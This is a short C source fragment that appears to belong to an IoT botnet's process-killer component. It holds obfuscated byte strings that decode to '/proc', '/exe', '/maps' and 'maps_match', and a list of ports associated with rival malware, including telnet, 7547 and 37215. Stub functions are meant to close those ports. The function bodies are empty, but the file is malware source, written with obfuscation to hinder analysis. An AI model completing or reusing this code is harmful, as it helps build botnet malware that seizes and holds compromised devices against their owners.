#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>


char *killable_strings[] = {
	"\xD3\xC4\xD1\xCE\xD3\xD5\x81",
	"\xEC\xE0\xF1\xF2\xDE\xEC\xE0\xF5\xE2\xE9\x81", //maps_match
};

char *proc_dirs[] = {
	"\xAE\xF1\xF3\xEE\xE2\x81", // /proc
	"\xAE\xE4\xF9\xE4\x81", // /exe
	"\xAE\xEC\xE0\xF1\xF2\x81", // /maps
};


//add as you go
static int malware_instance_ports[] = {22, 23, 80, 8080, 443, 666, 6667, 7547, 37215};

char close_port(uint16_t port) {

}

void shutdown_malware_instance_ports(void) {
	int i;
	for(i = 0; i < 9;i++) {

	}
}